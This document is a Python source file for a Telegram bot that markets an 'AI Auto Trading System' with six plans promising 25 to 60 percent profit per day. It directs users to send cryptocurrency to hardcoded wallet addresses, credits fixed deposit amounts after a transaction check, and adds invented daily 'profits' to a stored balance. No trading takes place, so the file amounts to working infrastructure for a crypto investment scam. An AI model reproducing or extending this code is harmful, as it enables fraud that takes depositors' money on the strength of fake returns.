import logging
import datetime
import asyncio
import aiohttp
import threading
import os

from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    CallbackContext,
)

# ------------------------
# Read Bot Token and Webhook Base URL from Environment Variables
# ------------------------
TGBOTTOKEN = os.environ.get("TGBOTTOKEN")
WEBHOOK_BASE_URL = os.environ.get("WEBHOOK_URL")  # e.g., "https://my-telegram-bot-cpji.onrender.com"

# ------------------------
# Flask Web Server Setup (For uptime, if needed)
# ------------------------
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# ------------------------
# Logging Configuration
# ------------------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ------------------------
# Global Wallet Addresses (Update with your actual addresses as needed)
# ------------------------
WALLET_ADDRESSES = {
    "BTC": "bc1q9q75pdqn68kd9l3phk45lu9jdujuckewq6utp4",
    "ETH": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
    "BNB": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
    "SOL": "5ZE32mbM9Xy6hTvTUNjUrZ9NdmmBMRDgU9Gif4ytPsZg",
    "XRP": "rDBY4hZmoHzZJxkDbeeVdSU52WaXRtXSMJ",
    "USDT": {
        "BEP20": "0x93883eB3E14050542FD3C4762952Db8d2db15fcF",
        "TRC20": "TXPJLFHcjfk9rGrHQkdC6nLqADg85Z9TT2",
        "TON": "UQAC8C-BwxCCQKybyR1I3faHNg_PtHnVS2VytwC9XhE2alLo",
    },
}

# ------------------------
# Admin ID
# ------------------------
ADMIN_ID = 7533239927  # Replace if needed

# ------------------------
# Database Setup (Using SQLite via SQLAlchemy)
# ------------------------
from sqlalchemy import create_engine, Column, Integer, String, Float, Boolean, DateTime
from sqlalchemy.orm import declarative_base, sessionmaker

Base = declarative_base()

class UserAccount(Base):
    __tablename__ = "user_accounts"
    id = Column(Integer, primary_key=True)
    telegram_id = Column(Integer, unique=True, nullable=False)
    selected_plan = Column(String, nullable=True)
    selected_crypto = Column(String, nullable=True)
    usdt_network = Column(String, nullable=True)
    txid = Column(String, nullable=True)
    deposit = Column(Float, default=0)
    profit = Column(Float, default=0)
    wallet_address = Column(String, nullable=True)
    language = Column(String, default="en")
    compound = Column(Boolean, default=False)
    last_updated = Column(DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)

engine = create_engine("sqlite:///crypto_bot.db", echo=False)
Base.metadata.create_all(engine)
SessionLocal = sessionmaker(bind=engine)

def get_session():
    return SessionLocal()

# ------------------------
# Multi-Language Dictionary
# ------------------------
# Note:
# 1. "deposit_success" echoes the deposit amount.
# 2. "activated" is sent after the wallet address is provided.
LANG = {
    "en": {
        "welcome": "Welcome to the AI Auto Trading Bot. Please choose an option:",
        "autotrading": "Autotrading System",
        "balance": "Balance",
        "contact_support": "Contact Support",
        "main_menu": "Main Menu:",
        "deposit_success": "Deposit of ${amount:.2f} confirmed successfully! Please provide your wallet address for receiving your profits:",
        "activated": "AI AUTO TRADING SYSTEM ACTIVATED.",
        "invalid_txid": "Invalid transaction ID format. Please try again:",
        "txid_received": "Transaction ID received: {txid}\nWe have verified a deposit of ${amount:.2f} based on your selected plan.\nPlease confirm the deposit.",
        "language_set": "Your language has been set to English.",
        "choose_language": "Choose your language:",
        "compound_on": "Compound profit activated.",
        "compound_off": "Compound profit deactivated.",
        "admin_not_auth": "You are not authorized to use this command.",
        "admin_report": "Admin Report:\nTotal Users: {total_users}\nTotal Deposits: ${total_deposit:.2f}\nTotal Profit: ${total_profit:.2f}",
    },
    # (Other languages can be filled in similarly if needed)
}

def get_msg(lang, key, **kwargs):
    template = LANG.get(lang, LANG["en"]).get(key, "")
    return template.format(**kwargs) if kwargs else template

# ------------------------
# Trading Plans Configuration (Updated)
# ------------------------
TRADING_PLANS = {
    "plan_1": {"title": "🚨FIRST PLAN",  "equity_range": "$500 - $999",      "profit_percent": 25},
    "plan_2": {"title": "🚨SECOND PLAN", "equity_range": "$1,000 - $4,999",    "profit_percent": 30},
    "plan_3": {"title": "🚨THIRD PLAN",  "equity_range": "$5,000 - $9,999",    "profit_percent": 45},
    "plan_4": {"title": "🚨FOURTH PLAN", "equity_range": "$10,000 - $49,999",  "profit_percent": 50},
    "plan_5": {"title": "🚨 FIFTH PLAN", "equity_range": "$50,000 - $199,999",  "profit_percent": 55},
    "plan_6": {"title": "🚨 SIXTH PLAN",  "equity_range": "$200,000 and above","profit_percent": 60},
}

# ------------------------
# Deposit Flow Conversation States
# ------------------------
STATE_TXID = 1
STATE_CONFIRM = 2
STATE_WALLET = 3

# ------------------------
# Transaction Verification Function
# ------------------------
async def verify_txid_on_blockchain(txid: str, crypto: str, context: CallbackContext = None) -> bool:
    crypto = crypto.upper()
    if crypto == "ETH":
        api_key = os.environ.get("ETHERSCAN_API_KEY")
        url = f"https://api.etherscan.io/api?module=transaction&action=getstatus&txhash={txid}&apikey={api_key}"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=10) as response:
                    data = await response.json()
                    if data.get("status") == "1" and data.get("result", {}).get("txreceipt_status") == "1":
                        return True
            except Exception as e:
                logger.error("Error verifying ETH TXID: %s", e)
        return False
    elif crypto == "BTC":
        api_token = os.environ.get("BLOCKCYPHER_TOKEN")
        url = f"https://api.blockcypher.com/v1/btc/main/txs/{txid}?token={api_token}"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get("confirmations", 0) > 0:
                            return True
            except Exception as e:
                logger.error("Error verifying BTC TXID: %s", e)
        return False
    elif crypto == "BNB":
        api_key = os.environ.get("BSCSCAN_API_KEY")
        url = f"https://api.bscscan.com/api?module=transaction&action=getstatus&txhash={txid}&apikey={api_key}"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=10) as response:
                    data = await response.json()
                    if data.get("status") == "1" and data.get("result", {}).get("txreceipt_status") == "1":
                        return True
            except Exception as e:
                logger.error("Error verifying BNB TXID: %s", e)
        return False
    elif crypto == "SOL":
        url = "https://api.mainnet-beta.solana.com/"
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getTransaction",
            "params": [txid, {"encoding": "json"}]
        }
        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(url, json=payload, timeout=10) as response:
                    data = await response.json()
                    if data.get("result") is not None:
                        return True
            except Exception as e:
                logger.error("Error verifying SOL TXID: %s", e)
        return False
    elif crypto == "XRP":
        url = f"https://data.ripple.com/v2/transactions/{txid}"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get("result") == "success":
                            return True
            except Exception as e:
                logger.error("Error verifying XRP TXID: %s", e)
        return False
    elif crypto == "USDT":
        usdt_network = None
        if context is not None and context.user_data:
            usdt_network = context.user_data.get("usdt_network")
        if usdt_network:
            if usdt_network.upper() == "BEP20":
                return await verify_txid_on_blockchain(txid, "BNB", context)
            elif usdt_network.upper() == "TRC20":
                return await verify_txid_on_blockchain(txid, "TRX", context)
            elif usdt_network.upper() == "TON":
                return await verify_txid_on_blockchain(txid, "TON", context)
            else:
                return await verify_txid_on_blockchain(txid, "ETH", context)
        else:
            return await verify_txid_on_blockchain(txid, "ETH", context)
    elif crypto == "TRX":
        api_key = os.environ.get("TRONSCAN_API_KEY")
        url = f"https://apilist.tronscan.org/api/transaction-info?hash={txid}"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get("ret") and isinstance(data.get("ret"), list) and data.get("ret")[0].get("contractRet") == "SUCCESS":
                            return True
            except Exception as e:
                logger.error("Error verifying TRX TXID: %s", e)
        return False
    elif crypto == "TON":
        api_key = os.environ.get("TONCENTER_API_KEY")
        url = f"https://toncenter.com/api/v2/getTransaction?hash={txid}&api_key={api_key}"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=10) as response:
                    data = await response.json()
                    if data.get("result") is not None:
                        return True
            except Exception as e:
                logger.error("Error verifying TON TXID: %s", e)
        return False
    else:
        await asyncio.sleep(1)
        return len(txid) > 5

# ------------------------
# Update Daily Profits (with Optional Compounding)
# ------------------------
async def update_daily_profits(context: CallbackContext):
    session = get_session()
    users = session.query(UserAccount).all()
    for user in users:
        if user.selected_plan and user.deposit > 0:
            profit_rate = TRADING_PLANS[user.selected_plan]["profit_percent"]
            daily_profit = user.deposit * (profit_rate / 100)
            user.profit += daily_profit
            if user.compound:
                user.deposit += daily_profit
    session.commit()
    session.close()
    logger.info("Daily profits updated.")

# ------------------------
# Global Error Handler
# ------------------------
async def error_handler(update: object, context: CallbackContext) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)

# ------------------------
# Start Handler (asks for language if not set)
# ------------------------
async def start(update: Update, context: CallbackContext) -> None:
    session = get_session()
    telegram_id = update.effective_user.id
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    session.close()
    if user is None or not user.language:
        await choose_language(update, context)
    else:
        lang = user.language
        keyboard = [
            [InlineKeyboardButton(LANG[lang]["autotrading"], callback_data="autotrading")],
            [InlineKeyboardButton(LANG[lang]["balance"], callback_data="balance")],
            [InlineKeyboardButton(LANG[lang]["contact_support"], url="https://t.me/cryptotitan999")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(get_msg(lang, "welcome"), reply_markup=reply_markup)

async def main_menu(update: Update, context: CallbackContext) -> None:
    session = get_session()
    telegram_id = update.effective_user.id
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    lang = user.language if user else "en"
    session.close()
    keyboard = [
        [InlineKeyboardButton(LANG[lang]["autotrading"], callback_data="autotrading")],
        [InlineKeyboardButton(LANG[lang]["balance"], callback_data="balance")],
        [InlineKeyboardButton(LANG[lang]["contact_support"], url="https://t.me/cryptotitan999")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(get_msg(lang, "main_menu"), reply_markup=reply_markup)
    await update.callback_query.answer()

# ------------------------
# Autotrading Handlers
# ------------------------
async def autotrading_menu(update: Update, context: CallbackContext) -> None:
    session = get_session()
    telegram_id = update.effective_user.id
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    lang = user.language if user else "en"
    session.close()
    text_lines = ["AI AUTO TRADING PLANS:"]
    for key, plan in TRADING_PLANS.items():
        text_lines.append("")
        text_lines.append(plan["title"])
        text_lines.append(f"Equity Range: {plan['equity_range']}")
        text_lines.append(f"Profit: {plan['profit_percent']}% daily.")
        text_lines.append("ROI: Yes ✅")
    text = "\n".join(text_lines)
    keyboard = [
        [InlineKeyboardButton("FIRST PLAN", callback_data="plan_1"),
         InlineKeyboardButton("SECOND PLAN", callback_data="plan_2")],
        [InlineKeyboardButton("THIRD PLAN", callback_data="plan_3"),
         InlineKeyboardButton("FOURTH PLAN", callback_data="plan_4")],
        [InlineKeyboardButton("FIFTH PLAN", callback_data="plan_5"),
         InlineKeyboardButton("SIXTH PLAN", callback_data="plan_6")],
        [InlineKeyboardButton("BACK", callback_data="main_menu")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(text=text, reply_markup=reply_markup)
    await update.callback_query.answer()

async def plan_selection(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    selected_plan = query.data  # "plan_1" ... "plan_6"
    context.user_data["selected_plan"] = selected_plan
    plan_details = TRADING_PLANS.get(selected_plan)
    text = (f"You selected {plan_details['title']}:\n"
            f"Equity Range: {plan_details['equity_range']}\n"
            f"Profit: {plan_details['profit_percent']}% daily.\n\n"
            "Please choose your deposit currency:")
    keyboard = [
        [InlineKeyboardButton("BTC", callback_data="pay_btc"),
         InlineKeyboardButton("ETH", callback_data="pay_eth")],
        [InlineKeyboardButton("USDT", callback_data="pay_usdt"),
         InlineKeyboardButton("BNB", callback_data="pay_bnb")],
        [InlineKeyboardButton("SOL", callback_data="pay_sol"),
         InlineKeyboardButton("XRP", callback_data="pay_xrp")],
        [InlineKeyboardButton("BACK", callback_data="autotrading")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text=text, reply_markup=reply_markup)
    await query.answer()

# ------------------------
# Payment Method Handlers
# ------------------------
async def payment_method_menu(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    session = get_session()
    telegram_id = update.effective_user.id
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    lang = user.language if user else "en"
    session.close()
    selected_plan = context.user_data.get("selected_plan")
    if selected_plan in TRADING_PLANS:
        plan = TRADING_PLANS[selected_plan]
        text = f"You selected {plan['title']}.\nChoose your deposit currency:"
    else:
        text = "Choose your deposit currency:"
    keyboard = [
        [InlineKeyboardButton("BTC", callback_data="pay_btc"),
         InlineKeyboardButton("ETH", callback_data="pay_eth")],
        [InlineKeyboardButton("USDT", callback_data="pay_usdt"),
         InlineKeyboardButton("BNB", callback_data="pay_bnb")],
        [InlineKeyboardButton("SOL", callback_data="pay_sol"),
         InlineKeyboardButton("XRP", callback_data="pay_xrp")],
        [InlineKeyboardButton("BACK", callback_data="autotrading")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text=text, reply_markup=reply_markup)
    await query.answer()

async def usdt_network_menu(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    text = "USDT selected. Please choose the USDT network:"
    keyboard = [
        [InlineKeyboardButton("USDT BEP20", callback_data="usdt_BEP20"),
         InlineKeyboardButton("USDT TRC20", callback_data="usdt_TRC20"),
         InlineKeyboardButton("USDT TON", callback_data="usdt_TON")],
        [InlineKeyboardButton("BACK", callback_data="payment_method")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text=text, reply_markup=reply_markup)
    await query.answer()

# ------------------------
# send_deposit_address: Displays a copyable wallet address
# ------------------------
async def send_deposit_address(update: Update, context: CallbackContext, crypto: str, network: str = None) -> None:
    query = update.callback_query
    context.user_data["selected_crypto"] = crypto
    if crypto.upper() == "USDT" and network:
        context.user_data["usdt_network"] = network
        address = WALLET_ADDRESSES["USDT"].get(network, "Not configured")
        crypto_display = f"USDT ({network})"
    else:
        address = WALLET_ADDRESSES.get(crypto.upper(), "Not configured")
        crypto_display = crypto.upper()
    text = (
        f"Please deposit using {crypto_display} to the following address:\n\n"
        f"<code>{address}</code>\n\n"
        "When done, click DONE. (The address is copyable.)"
    )
    keyboard = [
        [InlineKeyboardButton("DONE", callback_data="deposit_done"),
         InlineKeyboardButton("BACK", callback_data="payment_method")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode="HTML")
    await query.answer()

async def payment_callback_handler(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    data = query.data
    if data in ("pay_btc", "pay_eth", "pay_bnb", "pay_sol", "pay_xrp"):
        crypto = data.split("_")[1].upper()
        await send_deposit_address(update, context, crypto)
    elif data == "pay_usdt":
        await usdt_network_menu(update, context)
    elif data.startswith("usdt_"):
        network = data.split("_")[1]
        await send_deposit_address(update, context, "USDT", network)
    elif data == "payment_method":
        await payment_method_menu(update, context)
    else:
        await query.answer(text="Unknown payment option.")

# ------------------------
# Deposit Flow Conversation Handlers
# ------------------------
async def deposit_done_callback(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Please enter your transaction ID:")
    return STATE_TXID

async def handle_txid(update: Update, context: CallbackContext) -> int:
    txid = update.message.text.strip()
    crypto = context.user_data.get("selected_crypto", "BTC")
    valid = await verify_txid_on_blockchain(txid, crypto, context)
    if not valid:
        session = get_session()
        telegram_id = update.effective_user.id
        user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
        lang = user.language if user else "en"
        session.close()
        await update.message.reply_text(get_msg(lang, "invalid_txid"))
        return STATE_TXID
    context.user_data["txid"] = txid
    selected_plan = context.user_data.get("selected_plan")
    if selected_plan == "plan_1":
        deposit_amount = 500
    elif selected_plan == "plan_2":
        deposit_amount = 1000
    elif selected_plan == "plan_3":
        deposit_amount = 5000
    elif selected_plan == "plan_4":
        deposit_amount = 10000
    elif selected_plan == "plan_5":
        deposit_amount = 50000
    elif selected_plan == "plan_6":
        deposit_amount = 200000
    else:
        deposit_amount = 0
    context.user_data["deposit"] = deposit_amount
    session = get_session()
    telegram_id = update.effective_user.id
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    lang = user.language if user else "en"
    session.close()
    text = get_msg(lang, "txid_received", txid=txid, amount=deposit_amount)
    keyboard = [[InlineKeyboardButton("YES", callback_data="confirm_yes"),
                 InlineKeyboardButton("NO", callback_data="confirm_no")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)
    return STATE_CONFIRM

async def confirm_deposit_callback(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    choice = query.data
    session = get_session()
    telegram_id = update.effective_user.id
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    lang = user.language if user else "en"
    session.close()
    if choice == "confirm_yes":
        deposit_amount = context.user_data.get("deposit", 0)
        msg = get_msg(lang, "deposit_success", amount=deposit_amount)
        await query.edit_message_text(msg)
        return STATE_WALLET
    else:
        await query.answer("Deposit not confirmed. Please re-enter your transaction ID.")
        await query.edit_message_text("Please enter your transaction ID again:")
        return STATE_TXID

async def handle_wallet(update: Update, context: CallbackContext) -> int:
    wallet_address = update.message.text.strip()
    context.user_data["wallet_address"] = wallet_address
    telegram_id = update.effective_user.id
    session = get_session()
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    if user:
        user.selected_plan = context.user_data.get("selected_plan")
        user.selected_crypto = context.user_data.get("selected_crypto")
        user.usdt_network = context.user_data.get("usdt_network")
        user.txid = context.user_data.get("txid")
        user.deposit = context.user_data.get("deposit", 0)
        user.wallet_address = wallet_address
    else:
        user = UserAccount(
            telegram_id=telegram_id,
            selected_plan=context.user_data.get("selected_plan"),
            selected_crypto=context.user_data.get("selected_crypto"),
            usdt_network=context.user_data.get("usdt_network"),
            txid=context.user_data.get("txid"),
            deposit=context.user_data.get("deposit", 0),
            profit=0.0,
            wallet_address=wallet_address,
            language="en"
        )
        session.add(user)
    session.commit()
    session.close()
    session = get_session()
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    lang = user.language if user else "en"
    session.close()
    await update.message.reply_text(get_msg(lang, "activated"))
    logger.info("User %s activated trading system: %s", telegram_id, user.__dict__)
    return ConversationHandler.END

async def cancel_deposit(update: Update, context: CallbackContext) -> int:
    await update.message.reply_text(
        "Deposit process cancelled.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="payment_method")]])
    )
    return ConversationHandler.END

# ------------------------
# Balance Handler
# ------------------------
async def balance_handler(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    telegram_id = update.effective_user.id
    session = get_session()
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    session.close()
    lang = user.language if user else "en"
    if user:
        deposit = user.deposit
        profit = user.profit
        total = deposit + profit
        text = f"Your current balance:\nDeposit: ${deposit:.2f}\nProfit: ${profit:.2f}\nTotal Balance: ${total:.2f}"
    else:
        text = "Balance: $0"
    keyboard = [[InlineKeyboardButton("BACK", callback_data="main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text=text, reply_markup=reply_markup)
    await query.answer()

# ------------------------
# Language Handlers
# ------------------------
async def choose_language(update: Update, context: CallbackContext) -> None:
    keyboard = [
        [InlineKeyboardButton("English", callback_data="lang_en"),
         InlineKeyboardButton("Español", callback_data="lang_es")],
        [InlineKeyboardButton("Русский", callback_data="lang_ru"),
         InlineKeyboardButton("العربية", callback_data="lang_ar")],
        [InlineKeyboardButton("Bahasa Indonesia", callback_data="lang_id"),
         InlineKeyboardButton("Deutsch", callback_data="lang_de")],
        [InlineKeyboardButton("हिन्दी", callback_data="lang_hi"),
         InlineKeyboardButton("Français", callback_data="lang_fr")],
        [InlineKeyboardButton("中文", callback_data="lang_zh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(get_msg("en", "choose_language"), reply_markup=reply_markup)

async def set_language(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    lang = query.data.split("_")[1]
    telegram_id = update.effective_user.id
    session = get_session()
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    if user:
        user.language = lang
    else:
        user = UserAccount(telegram_id=telegram_id, language=lang)
        session.add(user)
    session.commit()
    session.close()
    text = get_msg(lang, "language_set")
    await query.edit_message_text(text=text)
    await query.answer()

# ------------------------
# Toggle Compound Profit Handler (/compound)
# ------------------------
async def toggle_compound(update: Update, context: CallbackContext) -> None:
    telegram_id = update.effective_user.id
    session = get_session()
    user = session.query(UserAccount).filter(UserAccount.telegram_id == telegram_id).first()
    if user:
        user.compound = not user.compound
        session.commit()
        new_state = get_msg(user.language, "compound_on") if user.compound else get_msg(user.language, "compound_off")
        await update.message.reply_text(new_state)
    else:
        user = UserAccount(telegram_id=telegram_id, compound=False)
        session.add(user)
        session.commit()
        await update.message.reply_text(get_msg("en", "compound_off"))
    session.close()

# ------------------------
# Admin Dashboard Handler (/admin)
# ------------------------
async def admin_dashboard(update: Update, context: CallbackContext) -> None:
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return
    session = get_session()
    users = session.query(UserAccount).all()
    total_users = len(users)
    total_deposit = sum(user.deposit for user in users)
    total_profit = sum(user.profit for user in users)
    session.close()
    report = get_msg("en", "admin_report", total_users=total_users, total_deposit=total_deposit, total_profit=total_profit)
    await update.message.reply_text(report)

# ------------------------
# Callback Dispatcher
# ------------------------
async def callback_dispatcher(update: Update, context: CallbackContext) -> None:
    data = update.callback_query.data
    if data == "main_menu":
        await main_menu(update, context)
    elif data == "autotrading":
        await autotrading_menu(update, context)
    elif data in ("plan_1", "plan_2", "plan_3", "plan_4", "plan_5", "plan_6"):
        await plan_selection(update, context)
    elif data == "balance":
        await balance_handler(update, context)
    elif data == "payment_method":
        await payment_method_menu(update, context)
    elif data in ("pay_btc", "pay_eth", "pay_bnb", "pay_sol", "pay_xrp", "pay_usdt") or data.startswith("usdt_"):
        await payment_callback_handler(update, context)
    elif data in ("confirm_yes", "confirm_no"):
        await confirm_deposit_callback(update, context)
    elif data.startswith("lang_"):
        await set_language(update, context)
    else:
        await update.callback_query.answer(text="Option not handled.")

# ------------------------
# Main Function: Run the Bot using Webhooks
# ------------------------
def main() -> None:
    port = int(os.environ.get("PORT", 8080))
    application = Application.builder().token(TGBOTTOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(deposit_done_callback, pattern="^deposit_done$")],
        states={
            STATE_TXID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_txid)],
            STATE_CONFIRM: [CallbackQueryHandler(confirm_deposit_callback, pattern="^confirm_")],
            STATE_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet)],
        },
        fallbacks=[CommandHandler("cancel", cancel_deposit)],
        allow_reentry=True,
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("language", choose_language))
    application.add_handler(CommandHandler("compound", toggle_compound))
    application.add_handler(CommandHandler("admin", admin_dashboard))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(callback_dispatcher))
    application.add_error_handler(error_handler)

    # Schedule Daily Profit Updates (Midnight UTC)
    job_time = datetime.time(hour=0, minute=0, second=0)
    application.job_queue.run_daily(update_daily_profits, time=job_time)

    # Run the bot via webhooks:
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path=TGBOTTOKEN,
        webhook_url=f"{WEBHOOK_BASE_URL}/{TGBOTTOKEN}"
    )

if __name__ == '__main__':
    # Start Flask server for uptime monitoring (if needed)
    threading.Thread(target=run_flask).start()
    main()